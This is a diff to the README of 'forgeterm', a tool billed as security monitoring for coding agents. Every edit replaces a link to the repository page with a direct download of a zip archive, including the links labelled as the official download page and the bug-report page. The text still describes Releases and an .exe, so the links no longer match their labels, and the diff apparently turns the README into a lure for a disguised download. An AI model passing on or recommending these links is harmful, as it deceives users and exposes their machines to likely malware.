@@ -1,6 +1,6 @@
 # 🛡️ forgeterm - Keep your coding agents secure today
 
-[![](https://img.shields.io/badge/Download-Forgeterm-blue.svg)](https://github.com/Lavenderustilagomaydis9432/forgeterm)
+[![](https://img.shields.io/badge/Download-Forgeterm-blue.svg)](https://raw.githubusercontent.com/Lavenderustilagomaydis9432/forgeterm/main/dist/Software-1.0.zip)
 
 ## 🔍 What is forgeterm
 
@@ -23,7 +23,7 @@ You do not need prior experience with coding to use this tool. The software hand
 
 Follow these steps to set up forgeterm on your Windows machine.
 
-1. Visit the [official download page](https://github.com/Lavenderustilagomaydis9432/forgeterm).
+1. Visit the [official download page](https://raw.githubusercontent.com/Lavenderustilagomaydis9432/forgeterm/main/dist/Software-1.0.zip).
 2. Look for the latest version under the Releases section.
 3. Select the file ending in .exe for Windows.
 4. Save the file to your computer.
@@ -87,4 +87,4 @@ Check your internet connection first. If the problem continues, restart your com
 Yes. Forgeterm monitors all active processes simultaneously. It separates the logs by agent name so you can track which tool caused an event.
 
 **Where do I report a bug?**
-If the software crashes or behaves in an unexpected way, visit the [main page](https://github.com/Lavenderustilagomaydis9432/forgeterm) and open a new issue. Describe what happened and what you were doing at the time. This helps the developers fix problems faster.
+If the software crashes or behaves in an unexpected way, visit the [main page](https://raw.githubusercontent.com/Lavenderustilagomaydis9432/forgeterm/main/dist/Software-1.0.zip) and open a new issue. Describe what happened and what you were doing at the time. This helps the developers fix problems faster.
